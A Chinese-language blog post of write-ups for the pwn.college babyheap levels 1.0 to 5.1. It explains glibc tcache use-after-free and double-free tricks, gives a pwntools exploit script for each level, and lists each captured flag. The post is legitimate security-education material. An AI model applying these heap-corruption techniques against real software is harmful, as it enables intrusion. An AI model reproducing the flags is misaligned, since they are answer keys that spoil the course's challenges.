---
title: "Write-ups: Program Security (Dynamic Allocator Misuse) series"
published: 2025-09-08
updated: 2025-09-08
description: "Write-ups for pwn.college binary exploitation series."
image: "https://cdn.jsdmirror.com/gh/CuB3y0nd/picx-images-hosting@master/.41yct5dsj8.avif"
tags: ["Pwn", "Write-ups", "Heap"]
category: "Write-ups"
draft: false
---

# 前言

悲，这篇博客最早是在 2025-01-25 开始写的，那会儿刚准备开始学堆，结果却因为各种各样的原因（主要是未来路线规划和刚接触堆面对各种陌生的新知识感觉十分害怕，也确实不懂，觉得很难），就去干别的了。没想到一直到 25 年 9 月才重新开始写这篇博客……既然如此，那就干脆把以前写的全删了，从头开始刷这章好了……

其实发现以前写的多少有点小问题，虽然现在我会的也只是比一开始的时候多了那么一丢丢，只是粗略了解了一点 glibc 堆分配机制而已。总的来说，面对这一章我本质上还是从零开始，差不多吧……

# Level 1.0

## Information

- Category: Pwn

## Description

> Exploit a use-after-free vulnerability to get the flag.

## Write-up

我就不贴反编译代码了，感觉也没啥好贴的。主要还是说说思路吧：

`read_flag` 会 malloc 330 字节空间，然后将 flag 读到 malloc 返回的地址中。

`puts` 会输出全局变量 `ptr` 中的内容，也就是说我们只要想办法让 read_flag 的 malloc 返回的地址与 ptr 保存的地址相同，就可以通过 puts 输出 flag 的内容。

因为 glibc 堆分配器会从 bins 中寻找并复用大小近似的 free chunk，所以我们可以先通过调用 malloc 分配一块 330 字节的空间，然后 free 掉。这样下次如果还 malloc 330 字节大小的空间就会复用我们第一次 malloc 330 返回的地址。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    context,
    log,
    process,
    raw_input,
    remote,
)

FILE = "/challenge/babyheap_level1.0"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def malloc(size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Size: ", str(size))


def free():
    target.sendlineafter(b": ", b"free")


def puts():
    target.sendlineafter(b": ", b"puts")


def read_flag():
    target.sendlineafter(b": ", b"read_flag")


def quit():
    target.sendlineafter(b": ", b"quit")


def main():
    launch()

    malloc(330)
    free()
    read_flag()
    puts()
    quit()

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{8_UCfYUIGnvHU86NU1Qe-H6dK1o.0VM3MDL5cTNxgzW}`]

# Level 1.1

## Information

- Category: Pwn

## Description

> Exploit a use-after-free vulnerability to get the flag.

## Write-up

参见 [Level 1.0](#level-10)。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    context,
    log,
    process,
    raw_input,
    remote,
)

FILE = "/challenge/babyheap_level1.1"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def malloc(size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Size: ", str(size))


def free():
    target.sendlineafter(b": ", b"free")


def puts():
    target.sendlineafter(b": ", b"puts")


def read_flag():
    target.sendlineafter(b": ", b"read_flag")


def quit():
    target.sendlineafter(b": ", b"quit")


def main():
    launch()

    malloc(618)
    free()
    read_flag()
    puts()
    quit()

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{8oPO3KqdZU5lZfzl5xftjR2IZif.0lM3MDL5cTNxgzW}`]

# Level 2.0

## Information

- Category: Pwn

## Description

> Create and exploit a use-after-free vulnerability to get the flag.

## Write-up

与 [Level 1](#level-10) 区别不大。但是在 malloc 存放 flag 的空间时使用的是 `rand() % 872 + 128`，这会生成 $[ 0+128,872+128)$ 范围内的随机数。所以我们要么预测它生成什么随机数，要么爆破它落在哪个 bin 中。

[rand](https://en.cppreference.com/w/c/numeric/random/rand) 生成的是伪随机数，可以预测。本来想直接预测 RNG 的：

```python
import ctypes

libc = ctypes.CDLL("./libc.so.6")

libc.srand(1)
predicted_size = (libc.rand() & 0x7FFFFFFF) % 872 + 128
```

但是后来发现程序在 `__libc_csu_init` 中调用了 `flag_seed`，而这个函数内部又调用了 `srand(seed)`，它的 seed 是循环异或栈上的数据得来的。虽然在每台机器上运行都会有特定的栈上的数据，但是并不是一个普适的方法，尽管我可以 debug 得到 seed，但是远程就打不通了。所以我们还是用爆破 bins 的方法好了。tcache bins 有限，这个 rand 生成的范围也不是很大，所以还是很容易爆破的。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    ELF,
    args,
    context,
    log,
    process,
    raw_input,
    remote,
)

FILE = "/challenge/babyheap_level2.0"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def malloc(size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Size: ", str(size))


def free():
    target.sendlineafter(b": ", b"free")


def puts():
    target.sendlineafter(b": ", b"puts")


def read_flag():
    target.sendlineafter(b": ", b"read_flag")


def quit():
    target.sendlineafter(b": ", b"quit")


def test_size(candidate):
    launch()
    malloc(candidate)
    free()
    read_flag()
    puts()

    response = target.recvall(timeout=0.01)
    if b"pwn.college{" in response:
        target.close()
        return True
    return False


def main():
    for bin in range(0x20, 0x410 + 1, 0x10):
        base_req = bin - 0x10
        ok = test_size(base_req)
        if ok:
            log.success(
                f"Found working requested size: {hex(base_req)} for tcache bin {hex(bin)}"
            )
            return
        log.warning("Exhausted candidates, none matched.")
    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{ME7LG_Jy8T-xEw9H_njxpD2aJ4z.01M3MDL5cTNxgzW}`]

# Level 2.1

## Information

- Category: Pwn

## Description

> Create and exploit a use-after-free vulnerability to get the flag.

## Write-up

参见 [Level 2.0](#level-20)。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    ELF,
    args,
    context,
    log,
    process,
    raw_input,
    remote,
)

FILE = "/challenge/babyheap_level2.1"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def malloc(size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Size: ", str(size))


def free():
    target.sendlineafter(b": ", b"free")


def puts():
    target.sendlineafter(b": ", b"puts")


def read_flag():
    target.sendlineafter(b": ", b"read_flag")


def quit():
    target.sendlineafter(b": ", b"quit")


def test_size(candidate):
    launch()
    malloc(candidate)
    free()
    read_flag()
    puts()

    response = target.recvall(timeout=0.01)
    if b"pwn.college{" in response:
        target.close()
        return True
    return False


def main():
    for bin in range(0x20, 0x410 + 1, 0x10):
        base_req = bin - 0x10
        ok = test_size(base_req)
        if ok:
            log.success(
                f"Found working requested size: {hex(base_req)} for tcache bin {hex(bin)}"
            )
            return
        log.warning("Exhausted candidates, none matched.")
    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{MihEcPIR1bQBmiQGOoGELSrscgW.0FN3MDL5cTNxgzW}`]

# Level 3.0

## Information

- Category: Pwn

## Description

> Create and exploit a use-after-free vulnerability to get the flag when multiple allocations occur.

## Write-up

这题和之前也差不多，只不过 `ptr` 变成了可以容纳 16 个指针的数组，然后 `read_flag` 会 malloc 两次，flag 被写入第二次 malloc 返回的地址中。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    ELF,
    args,
    context,
    log,
    process,
    raw_input,
    remote,
)

FILE = "/challenge/babyheap_level3.0"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def malloc(idx, size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Index: ", str(idx))
    target.sendlineafter(b"Size: ", str(size))


def free(idx):
    target.sendlineafter(b": ", b"free")
    target.sendlineafter(b"Index: ", str(idx))


def puts(idx):
    target.sendlineafter(b": ", b"puts")
    target.sendlineafter(b"Index: ", str(idx))


def read_flag():
    target.sendlineafter(b": ", b"read_flag")


def quit():
    target.sendlineafter(b": ", b"quit")


def main():
    launch()

    malloc(0, 773)
    malloc(1, 773)
    free(0)
    free(1)
    read_flag()
    puts(0)
    quit()

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{wvvL-j9QzjeoJrOsQS4Vval7exq.0VN3MDL5cTNxgzW}`]

# Level 3.1

## Information

- Category: Pwn

## Description

> Create and exploit a use-after-free vulnerability to get the flag when multiple allocations occur.

## Write-up

参见 [Level 3.0](#level-30)。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    ELF,
    args,
    context,
    log,
    process,
    raw_input,
    remote,
)

FILE = "/challenge/babyheap_level3.1"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def malloc(idx, size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Index: ", str(idx))
    target.sendlineafter(b"Size: ", str(size))


def free(idx):
    target.sendlineafter(b": ", b"free")
    target.sendlineafter(b"Index: ", str(idx))


def puts(idx):
    target.sendlineafter(b": ", b"puts")
    target.sendlineafter(b"Index: ", str(idx))


def read_flag():
    target.sendlineafter(b": ", b"read_flag")


def quit():
    target.sendlineafter(b": ", b"quit")


def main():
    launch()

    malloc(0, 911)
    malloc(1, 911)
    free(0)
    free(1)
    read_flag()
    puts(0)
    quit()

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{wDLulwEpEQfpi78_Z4CAniTrByQ.0lN3MDL5cTNxgzW}`]

# Level 4.0

## Information

- Category: Pwn

## Description

> Corrupt the TCACHE entry_struct value to get the flag when multiple allocations occur.

## Write-up

变变变，围绕一个特定的主题，逐步递增难度，最后产生各种不同的变式，这就是我最喜欢 pwn.college 的地方，对于学习各种利用姿势来说非常友好。

这题回到了一开始的样子，`ptr` 是一个全局变量，用于保存 malloc 返回的指针。`read_flag` 延续了上题的风格，会 malloc 两次，flag 被写到第二次 malloc 返回的地址中。

此外，新增了下面这个 `scanf` 功能：

```c
      if ( strcmp(s1, "scanf") )
        break;
      v3 = malloc_usable_size(ptr);
      sprintf(s1, "%%%us", v3);
      v4 = malloc_usable_size(ptr);
      printf("[*] scanf(\"%%%us\", allocations[%d])\n", v4, 0);
      __isoc99_scanf(s1, ptr);
      puts(byte_246E);
```

它先通过 `malloc_usable_size(ptr)` 确定 ptr 保存的地址的 data 部分大小，然后通过 `sprintf(s1, "%%%us", v3)` 动态生成格式化字符串，写入 `s1` 中。`%%%us` 会先解析出一个 `%`，然后 `%u` 被解析为一个 `unsigned int`，最后加上 `s`，也就是根据 `v4` 动态生成 `%v4s` 这样的格式化字符串。

之后才是真正的读取输入，`__isoc99_scanf(s1, ptr)` 使用 s1 中保存的动态生成的格式化字符串，读取指定大小数据到 ptr 中。

:::important
tcache / fastbin 都是单链表，只使用了 fd 指针。区别是 tcache 的 fd 指向下一个 free chunk 的 data 区域，而 fastbin 的 fd 指向的是下一个 free chunk 的 metadata 区域。
:::

上面聊完了程序的大致功能，下面说点正经的做题思路：

我们 malloc / free 操作都受限于 ptr 指针，这个指针是固定值，而我们又希望 `read_flag` 将 flag 地址保存在 ptr 指针中，怎么办？我想了很多方法，起码也得有 5 种奇怪的方案，比如先泄漏堆地址，然后改写 ptr 指针的内容为 flag 的地址……结果最后都掉进了一些奇奇怪怪的 pitfall 里 awww，这里就不展开细说了……最后在某一天清晨，当我洗漱完继续投入到这道题中时，与平日截然相反地，我拿起了纸和笔，试图重新理理思路……结果[奇迹就发生了](https://memos.cubeyond.net/memos/NmPqpLBtMjrvZmUBMcPy92)……

简单来说就是，先 malloc 一块和 flag 需要的大小相同的区域，这时候 ptr 就变成了 malloc 的返回值，然后我们 free 它，它会被丢进 tcachebin 中。这时候如果我们直接调用 read_flag 的话，它的第一个 malloc 肯定会拿到我们刚才 free 掉的那个 chunk，然后因为没有其它空闲 chunk 了，就会从 arena 中开辟一个新的 chunk 出来，这样的话 flag 的地址就永远不会和 ptr 保存的地址相同了……<s>不行！太恶劣了！我绝对不允许这种事情发生在我眼皮底下！</s>所以，问题的关键就在于我们有没有办法令 read_flag 第二次 malloc 取得的地址和第一次 malloc 取得的一样？很简单，free 两次，tcachebin 中不就有两个一样的 free chunk 了吗？但是这样会触发 double free 检测，程序直接 abort，那么问题就变成了我们应该如何绕过这个检测了。

这里我们需要研究一下 glibc-2.31 的源码（pwn.college 这一章用的都是 2.31）：[薛定谔的 free chunks: Double Free, Double Fun ?](/posts/pwn-notes/pwn-trick-notes/#薛定谔的-free-chunks-double-free-double-fun-)

由于我们有 scanf 功能，可以向 ptr 指向的地址处写入数据，也就是说我们能写入 data 区。scanf 遇到换行则认为输入结束，并将换行替换为 `\x00`。我们想让 ptr 在 tcachebin 中出现两次，就可以这么玩：`malloc -> free -> scanf -> free -> read_flag -> puts`。至于这条攻击链的具体原理就自己琢磨去吧，我这里就不再过多赘述了。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    context,
    process,
    raw_input,
    remote,
)

FILE = "/challenge/babyheap_level4.0"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def malloc(size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Size: ", str(size).encode("ascii"))


def free():
    target.sendlineafter(b": ", b"free")


def puts():
    target.sendlineafter(b": ", b"puts")


def scanf(data):
    target.sendlineafter(b": ", b"scanf")
    target.sendline(data)


def read_flag():
    target.sendlineafter(b": ", b"read_flag")


def quit():
    target.sendlineafter(b": ", b"quit")


def main():
    launch()

    malloc(542)
    free()
    scanf(b"A" * 8)
    free()
    read_flag()
    puts()
    quit()

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{oZ6_TOkCX4vXbuU0gTGgGHmYWRJ.01N3MDL5cTNxgzW}`]

# Level 4.1

## Information

- Category: Pwn

## Description

> Corrupt the TCACHE entry_struct value to get the flag when multiple allocations occur.

## Write-up

参见 [Level 4.0](#level-40)。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    context,
    process,
    raw_input,
    remote,
)

FILE = "/challenge/babyheap_level4.1"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def malloc(size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Size: ", str(size).encode("ascii"))


def free():
    target.sendlineafter(b": ", b"free")


def puts():
    target.sendlineafter(b": ", b"puts")


def scanf(data):
    target.sendlineafter(b": ", b"scanf")
    target.sendline(data)


def read_flag():
    target.sendlineafter(b": ", b"read_flag")


def quit():
    target.sendlineafter(b": ", b"quit")


def main():
    launch()

    malloc(708)
    free()
    scanf(b"A" * 8)
    free()
    read_flag()
    puts()
    quit()

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{MHf4zKVq2DfY5MtZr8YZABG0Z4S.0FO3MDL5cTNxgzW}`]

# Level 5.0

## Information

- Category: Pwn

## Description

> Apply the TCACHE metadata in an unintended manner to set a value.

## Write-up

这题又是 ptr 数组，`read_flag` 将 flag 读到它 malloc 返回的地址加上 16 字节偏移的位置。然后就是新增了一个 `puts_flag` 函数：

```c
    if ( strcmp(s1, "puts_flag") )
      break;
    if ( *(_QWORD *)size_4 )
      puts(size_4 + 16);
    else
      puts("Not authorized!");
```

它检测 read_flag 的 malloc 返回的地址处的前 8 字节是否为空，不为空则输出 flag 。

对 `mlloc_chunk` 结构体熟悉的话就知道前 8 字节是 fd 的位置。那我们现在没有任何可以向 chunk data 写入数据的方法，如何修改 fd 呢？自然是 free 啦～

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    context,
    process,
    raw_input,
    remote,
)

FILE = "/challenge/babyheap_level5.0"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def malloc(idx, size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
    target.sendlineafter(b"Size: ", str(size).encode("ascii"))


def free(idx):
    target.sendlineafter(b": ", b"free")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))


def puts(idx):
    target.sendlineafter(b": ", b"puts")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))


def read_flag():
    target.sendlineafter(b": ", b"read_flag")


def puts_flag():
    target.sendlineafter(b": ", b"puts_flag")


def quit():
    target.sendlineafter(b": ", b"quit")


def main():
    launch()

    malloc(0, 496)
    malloc(1, 496)
    free(0)
    free(1)
    read_flag()
    free(1)
    puts_flag()
    quit()

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{ckg3CON3ru3-ygB82VxLMcRUuBS.0VO3MDL5cTNxgzW}`]

# Level 5.1

## Information

- Category: Pwn

## Description

> Apply the TCACHE metadata in an unintended manner to set a value.

## Write-up

参见 [Level 5.0](#level-50)。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    context,
    process,
    raw_input,
    remote,
)

FILE = "/challenge/babyheap_level5.1"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def malloc(idx, size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
    target.sendlineafter(b"Size: ", str(size).encode("ascii"))


def free(idx):
    target.sendlineafter(b": ", b"free")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))


def puts(idx):
    target.sendlineafter(b": ", b"puts")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))


def read_flag():
    target.sendlineafter(b": ", b"read_flag")


def puts_flag():
    target.sendlineafter(b": ", b"puts_flag")


def quit():
    target.sendlineafter(b": ", b"quit")


def main():
    launch()

    malloc(0, 456)
    malloc(1, 456)
    free(0)
    free(1)
    read_flag()
    free(1)
    puts_flag()
    quit()

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{YWZIg8kQV_nzpSzsFagMNO6O6Qn.0FM4MDL5cTNxgzW}`]
